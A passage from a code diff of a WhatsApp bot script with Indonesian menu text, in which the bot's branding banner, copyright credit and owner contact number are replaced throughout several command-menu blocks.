+©ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶`,
 }
 }}}), { userJid: m.chat, quoted: m })
 haikal.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
@@ -4364,7 +4364,7 @@ Hay Kak ${pushname} 👋 Selamat ${salam}
 ◎ Lib : Multi-Device
 ◎ Terbit : *12-09-2007*
 
-[ 🇲🇨 Ini adalah Bot Pribadi 𝑊𝑎𝑙𝑧 ]
+[ AMPAS NIH DECK ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶ ]
 *[ 🌷 ] Scrap Convert* 
 attp
 ttp
@@ -4385,10 +4385,10 @@ styletext
 smeme
 ss [url]
 🌷
-contact me Wa.me/6285723156229
+contact me Wa.me/37122252056
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
 Base Script
-©𝑊𝑎𝑙𝑧𝐼𝑠𝐻𝑒𝑟𝑒`,
+©ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶`,
 }
 }}}), { userJid: m.chat, quoted: m })
 haikal.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
@@ -4411,7 +4411,7 @@ Hay Kak ${pushname} 👋 Selamat ${salam}
 ◎ Lib : Multi-Device
 ◎ Terbit : *12-09-2007*
 
-[ 🇲🇨 Ini adalah Bot Pribadi 𝑊𝑎𝑙𝑧 ]
+[ AMPAS NIH DECK ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶ ]
 *[ 🌷 ] Cmd Menu* 
 setcmd
 listcmd
@@ -4422,10 +4422,10 @@ listmsg
 getmsg
 delmsg
 🌷
-contact me Wa.me/6285723156229
+contact me Wa.me/37122252056
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
 Base Script
-©𝑊𝑎𝑙𝑧𝐼𝑠𝐻𝑒𝑟𝑒`,
+©ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶`,
 }
 }}}), { userJid: m.chat, quoted: m })
 haikal.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
@@ -4447,7 +4447,7 @@ Hay Kak ${pushname} 👋 Selamat ${salam}
 ◎ Lib : Multi-Device
 ◎ Terbit : *12-09-2007*
 
-[ 🇲🇨 Ini adalah Bot Pribadi 𝑊𝑎𝑙𝑧 ]
+[ AMPAS NIH DECK ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶ ]
 *[ 🌷 ] Download Menu* 
 pinterestdl [url]
 ytmp3 [url]
@@ -4456,10 +4456,10 @@ getmusic [query]
 getvideo [query]
 mediafire [url]
 🌷
-contact me Wa.me/6285723156229
+contact me Wa.me/37122252056
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
 Base Script
-©𝑊𝑎𝑙𝑧𝐼𝑠𝐻𝑒𝑟𝑒`,
+©ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶`,
 }
 }}}), { userJid: m.chat, quoted: m })
 haikal.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
@@ -4482,7 +4482,7 @@ Hay Kak ${pushname} 👋 Selamat ${salam}
 ◎ Lib : Multi-Device
 ◎ Terbit : *12-09-2007*
 
-[ 🇲🇨 Ini adalah Bot Pribadi 𝑊𝑎𝑙𝑧 ]
+[ AMPAS NIH DECK ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶ ]
  *[ 🌷 ] Owner Menu* 
 react [emoji]
 chat [option]
@@ -4511,10 +4511,10 @@ listpc
 listgc
 listonline
 speedtest
-contact me Wa.me/6285723156229
+contact me Wa.me/37122252056
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
 Base Script
-©𝑊𝑎𝑙𝑧𝐼𝑠𝐻𝑒𝑟𝑒`,
+©ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶`,
 }
 }}}), { userJid: m.chat, quoted: m })
 haikal.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
@@ -4537,7 +4537,7 @@ Hay Kak ${pushname} 👋 Selamat ${salam}
 ◎ Lib : Multi-Device
 ◎ Terbit : *12-09-2007*
 
-[ 🇲🇨 Ini adalah Bot Pribadi 𝑊𝑎𝑙𝑧 ]
+[ AMPAS NIH DECK ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶ ]
  *[ 🌷 ] Scraper Image* 
 anime
 coffe
@@ -4578,10 +4578,10 @@ darkjoke
 meme
 meme2
 🌷
-contact me Wa.me/6285723156229
+contact me Wa.me/37122252056
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
 Base Script
-©𝑊𝑎𝑙𝑧𝐼𝑠𝐻𝑒𝑟𝑒`,
+©ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶`,
 }
 }}}), { userJid: m.chat, quoted: m })
 haikal.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
@@ -4603,7 +4603,7 @@ Hay Kak ${pushname} 👋 Selamat ${salam}
 ◎ Lib : Multi-Device
 ◎ Terbit : *12-09-2007*
 
-[ 🇲🇨 Ini adalah Bot Pribadi 𝑊𝑎𝑙𝑧 ]
+[ AMPAS NIH DECK ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶ ]
  *[ 🌷 ] Sound Menu* 
 sound1
 sound2
@@ -4767,10 +4767,10 @@ sound159
 sound160
 sound161
 🌷
-contact me Wa.me/6285723156229
+contact me Wa.me/37122252056
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
 Base Script
-©𝑊𝑎𝑙𝑧𝐼𝑠𝐻𝑒𝑟𝑒`,
+©ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶`,
 }
 }}}), { userJid: m.chat, quoted: m })
 haikal.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
